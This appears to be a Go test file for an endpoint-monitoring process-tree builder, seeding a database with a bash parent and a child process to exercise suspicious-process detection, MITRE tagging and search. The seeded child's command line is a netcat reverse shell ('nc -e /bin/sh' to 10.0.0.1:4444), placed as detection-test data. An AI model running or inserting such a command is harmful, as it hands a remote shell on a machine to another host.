package processtree

import (
	"context"
	"os"
	"testing"

	"github.com/jackc/pgx/v5/pgxpool"
)

// covPool connects to TEST_DATABASE_URL (the migrated schema), skipping when
// unset so the pure-logic tests stay green. These drive the DB-backed tree
// builder/search paths — the large query + row-assembly loops that the pure
// helper tests cannot reach.
func covPool(t *testing.T) *pgxpool.Pool {
	t.Helper()
	url := os.Getenv("TEST_DATABASE_URL")
	if url == "" {
		t.Skip("TEST_DATABASE_URL not set - skipping processtree coverage tests")
	}
	pool, err := pgxpool.New(context.Background(), url)
	if err != nil {
		t.Fatalf("pool: %v", err)
	}
	t.Cleanup(pool.Close)
	return pool
}

func TestBuilder_TreeAndSearch_DB(t *testing.T) {
	pool := covPool(t)
	ctx := context.Background()

	// Seed an agent and a small parent/child process pair (the child is a
	// suspicious bash→nc pair) so BuildTree walks its node-assembly loop,
	// suspicious detection, MITRE tagging and depth assignment.
	var agentID string
	if err := pool.QueryRow(ctx,
		`INSERT INTO agents (hostname, os_type, status, last_seen, enrolled_at)
		 VALUES ('cov-ptree', 'linux', 'online', NOW(), NOW()) RETURNING id::text`).Scan(&agentID); err != nil {
		t.Fatalf("seed agent: %v", err)
	}
	t.Cleanup(func() { _, _ = pool.Exec(ctx, "DELETE FROM agents WHERE id=$1", agentID) })

	var childEventID string
	_, _ = pool.Exec(ctx,
		`INSERT INTO events (agent_id, event_type, raw_data, time)
		 VALUES ($1::uuid, 'process',
		   '{"pid":"100","ppid":"1","process_name":"bash","command_line":"bash","username":"root","hostname":"cov-ptree"}'::jsonb,
		   NOW())`, agentID)
	_ = pool.QueryRow(ctx,
		`INSERT INTO events (agent_id, event_type, raw_data, time)
		 VALUES ($1::uuid, 'process',
		   '{"pid":"101","ppid":"100","process_name":"nc","command_line":"nc -e /bin/sh 10.0.0.1 4444","username":"root","parent_name":"bash","hostname":"cov-ptree"}'::jsonb,
		   NOW()) RETURNING event_id::text`, agentID).Scan(&childEventID)
	t.Cleanup(func() { _, _ = pool.Exec(ctx, "DELETE FROM events WHERE agent_id=$1", agentID) })

	b := NewBuilder(pool)

	tree, err := b.BuildTree(ctx, agentID, 24)
	if err != nil {
		t.Fatalf("BuildTree: %v", err)
	}
	if tree == nil {
		t.Fatalf("BuildTree returned nil")
	}

	if _, err := b.SearchProcesses(ctx, agentID, "nc", 24); err != nil {
		t.Fatalf("SearchProcesses: %v", err)
	}
	if _, err := b.SearchSuspiciousAllAgents(ctx, 24); err != nil {
		t.Fatalf("SearchSuspiciousAllAgents: %v", err)
	}
	if childEventID != "" {
		// GetProcessDetails may or may not find related rows; either way the
		// query/guard path runs. Ignore a not-found error.
		_, _ = b.GetProcessDetails(ctx, childEventID)
	}
}
